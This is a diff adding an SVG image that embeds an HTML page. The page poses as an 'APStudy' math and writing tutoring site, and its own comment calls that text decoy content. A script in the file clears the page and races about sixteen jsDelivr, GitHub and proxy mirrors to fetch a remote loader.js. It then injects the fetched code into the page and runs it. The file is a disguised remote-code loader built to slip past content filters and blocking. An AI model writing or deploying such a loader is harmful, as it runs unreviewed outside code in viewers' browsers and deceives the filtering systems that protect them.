@@ -1,0 +1,104 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">
+  <foreignObject width="100%" height="100%">
+    <html xmlns="http://www.w3.org/1999/xhtml" lang="en">
+      <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>APStudy | Math and Language Arts Tutoring</title>
+        <style>
+          html, body {
+            margin: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+          }
+          foreignObject {
+            overflow: visible;
+          }
+        </style>
+      </head>
+      <body style="background:#000">
+        <!-- Decoy content (never shown for long) -->
+        <div>
+          <p>APStudy helps students master algebra, calculus, geometry, and trigonometry alongside essay writing, grammar, and literary analysis for AP exams.</p>
+          <section>
+            <h2>Mathematics</h2>
+            <p>We cover algebra, calculus, derivatives, integrals, quadratic equations, probability, and statistics including the Pythagorean theorem and trigonometry.</p>
+          </section>
+          <section>
+            <h2>Science</h2>
+            <p>Sessions cover biology, chemistry, and physics through hypothesis, experiment, photosynthesis, and thermodynamics.</p>
+          </section>
+          <section>
+            <h2>English and Writing</h2>
+            <p>Tutors help with essay, thesis, grammar, syntax, rhetoric, symbolism, and irony across persuasive and narrative writing.</p>
+          </section>
+        </div>
+
+        <script>
+          (async () => {
+            // Force full-screen black page with white text, centered
+            document.body.style.cssText = 
+              "background:#000;color:#fff;margin:0;height:100vh;display:flex;justify-content:center;align-items:center;font-family:sans-serif;font-size:1.5rem;";
+            
+            document.body.textContent = "loading singlefile...";
+
+            // List of CDN / mirror bases that all point to the same payload
+            const bases = [
+              "https://cdn.jsdelivr.net/gh/TongSherbet/im-single/",
+              "https://cdn.jsdelivr.net/gh/TongSherbet/im-single/",
+              "https://fastly.jsdelivr.net/gh/TongSherbet/im-single/",
+              "https://testingcf.jsdelivr.net/gh/TongSherbet/im-single/",
+              "https://gcore.jsdelivr.net/gh/TongSherbet/im-single/",
+              "https://origin.fastly.jsdelivr.net/gh/TongSherbet/im-single/",
+              "https://jsdelivr.b-cdn.net/gh/TongSherbet/im-single/",
+              "https://cdn.statically.io/gh/TongSherbet/im-single@main/",
+              "https://raw.githack.com/TongSherbet/im-single/main/",
+              "https://raw.githubusercontent.com/TongSherbet/im-single/main/",
+              "https://cdn.staticdelivr.com/gh/TongSherbet/im-single/main/",
+              "https://raw.githubusercontent.com/TongSherbet/im-single/main/",
+              "https://git.yy.lx.win/github.com/TongSherbet/im-single/blob/main/",
+              "https://fastgit.cc/https://github.com/TongSherbet/im-single/blob/main/",
+              "https://raw.esm.sh/gh/TongSherbet/im-single/",
+              "https://esm.sh/gh/TongSherbet/im-single/"
+            ];
+
+            // Simple validation to make sure we got real JavaScript, not an error page
+            function validateJs(txt) {
+              if (!txt || txt.length < 200 || txt.trim().startsWith("<")) return false;
+              const openBraces  = (txt.match(/[{[(]/g) || []).length;
+              const closeBraces = (txt.match(/[}\])]/g) || []).length;
+              const hasKeywords = /\b(function|const|let|var|async|await|if|return)\b/.test(txt);
+              return hasKeywords && Math.abs(openBraces - closeBraces) <= 3;
+            }
+
+            const ac = new AbortController();
+
+            const fetchScript = async (base) => {
+              const url = `${base}loader.js?raw&${Math.floor(Date.now() / 3600000)}`;
+              const res = await fetch(url, { signal: ac.signal });
+              if (!res.ok) throw 0;
+              const txt = await res.text();
+              if (!validateJs(txt)) throw 0;
+              return { base, txt };
+            };
+
+            try {
+              // Race all mirrors – first successful one wins
+              const { base, txt } = await Promise.any(bases.map(fetchScript));
+              ac.abort();                          // cancel the other requests
+              window.RELAY_DOMAIN = base;          // store which mirror worked
+
+              // Inject the downloaded payload
+              const script = document.createElement("script");
+              script.textContent = txt;
+              document.head.appendChild(script);
+            } catch {
+              // all mirrors failed – do nothing
+            }
+          })();
+        </script>
+      </body>
+    </html>
+  </foreignObject>
+</svg>
